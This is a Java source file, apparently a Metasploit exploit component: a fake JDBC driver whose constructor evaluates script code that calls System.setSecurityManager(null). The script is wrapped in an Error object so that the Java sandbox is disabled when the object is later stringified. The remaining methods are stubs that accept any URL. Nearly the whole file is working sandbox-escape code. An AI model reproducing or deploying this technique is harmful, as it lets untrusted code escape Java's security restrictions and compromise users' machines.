import java.sql.*;
import java.util.logging.Logger;
import java.util.Properties;
import java.util.HashSet;
import java.util.Iterator;
import javax.script.*;
import java.io.*;
import java.lang.*;

public class FakeDriver2 extends HashSet implements java.sql.Driver
{
    public static final String URL_PREFIX = "jdbc:msf:sql:";

    static {

    }
        
    public FakeDriver2() {
		Iterator i = FakeDriver._s1.iterator();		
		try {
			ScriptEngine e = (ScriptEngine)i.next();
			Object proxy = (Object) e.eval(
				"this.toString = function() {" +
				"	java.lang.System.setSecurityManager(null);" +
				"	return '';" +
				"};" +
				"e = new Error();" +
				"e.message = this;" +
				"e");
			this.add(proxy);
		} catch (Exception ex) {
			//ex.printStackTrace();
		}	
	}

    public final boolean acceptsURL(String url)
        throws SQLException
    {
        return true;
    }
    
	public final boolean jdbcCompliant() {
        return true;
    }
 
    public final Logger getParentLogger() {
		return null;
	}
	
    public final int getMinorVersion() {
        return 0;
    }
    
	public final int getMajorVersion() {
        return 1;
    }
    
    public final DriverPropertyInfo[] getPropertyInfo(String url, Properties info)
        throws SQLException
    {
        return null;
    }
        
    public final Connection connect(String url, Properties info)
        throws SQLException
    {
        return null;
    }

}
